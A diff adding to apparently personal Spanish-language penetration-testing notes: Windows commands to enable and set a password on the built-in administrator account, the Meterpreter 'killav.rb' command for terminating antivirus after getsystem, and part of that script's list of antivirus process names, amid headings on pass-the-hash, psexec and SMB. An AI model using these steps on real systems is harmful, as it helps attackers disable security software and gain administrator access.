@@ -1,3 +1,15 @@
+WIN7 
+
+
+Habilitar cuenta administrad(t)or
+
+c:>>net user administrador active/yes
+C:>>net user administrador active/no
+C:>>net user administrador *
+c:>>escriba una contraseña para el usuario:  ;);););););););););)
+
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
 Pass the hash
 
 """""""""""""""""""""""""""""""""""""""""""""""""""psexec"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
@@ -276,6 +288,41 @@ getuid
 """"""""""""""""""""""""""""""""""""""""""""""""""ANTIVIRUS""""""""""""""""""""""""""""""""""Killing in the name of.....
 Opcion 1:
 >>meterpreter>>run killav.rb             //con privilegios --> getsystem
+
+Si vemos en detalle el código de killav.rb vamos a ver que tenemos una lista de los nombre de procesos de los 
+antivirus mas comunes....
+
+  			apimonitor.exe
+  			aplica32.exe
+  			apvxdwin.exe
+  			arr.exe
+  			atcon.exe
+  			atguard.exe
+  			atro55en.exe
+  			atupdater.exe
+  			atwatch.exe
+  			au.exe
+  			aupdate.exe
+  			auto-protect.nav80try.exe
+  			autodown.exe
+  			autotrace.exe
+  			autoupdate.exe
+  			avconsol.exe
+  			ave32.exe
+  			avgcc32.exe
+  			avgctrl.exe...............................bla bla bla
+  			
+Un antivirus tiene procesos asociados que van a revivir a nuestro cadaver (antivirus)
+
+
+  
+  
+  
+
+
+
+
+
 
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 NETBIOS/SMB
